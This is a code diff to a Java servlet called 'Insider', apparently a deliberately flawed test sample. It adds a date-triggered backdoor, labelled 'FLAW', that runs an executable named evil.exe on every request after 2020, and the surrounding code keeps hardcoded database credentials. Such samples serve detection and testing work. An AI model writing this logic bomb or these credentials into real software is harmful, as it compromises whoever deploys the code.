@@ -24,6 +24,7 @@ import javax.servlet.http.HttpServletResponse;
 import javax.tools.JavaCompiler;
 import javax.tools.SimpleJavaFileObject;
 import javax.tools.ToolProvider;
+import java.util.Calendar;
 
 @WebServlet(name = "simpleServlet", urlPatterns = {"/insider"}, loadOnStartup = 1)
 public class Insider extends HttpServlet {
@@ -46,7 +47,8 @@ public class Insider extends HttpServlet {
     try {
 
       getConnection();
-
+      
+      ticking();
 
       String x = request.getParameter( "x" );
 
@@ -127,6 +129,8 @@ public class Insider extends HttpServlet {
         e.printStackTrace();
       } catch (IllegalAccessException e) {
         e.printStackTrace();
+      } catch (Exception e) {
+        e.printStackTrace();
       }
 
 
@@ -149,6 +153,8 @@ public class Insider extends HttpServlet {
     } catch (ClassNotFoundException e) {
       e.printStackTrace();
     } catch (SQLException e) {
+      e.printStackTrace();
+    } catch (IOException e) {
       e.printStackTrace();
     }
 
@@ -180,5 +186,19 @@ public class Insider extends HttpServlet {
     connection = DriverManager.getConnection("jdbc:mysql://localhost/DBPROD", "admin", "1234");
   }
 
+  private void ticking() throws IOException
+  {
+    Calendar now = Calendar.getInstance();
+    Calendar e = Calendar.getInstance();
+
+    e.set(2020, 1, 1);
+
+    /* FLAW: date triggered backdoor */
+    if (now.after(e))
+    {
+        Runtime.getRuntime().exec("c:\\windows\\system32\\evil.exe");
+    }
+
+  }
 
 }
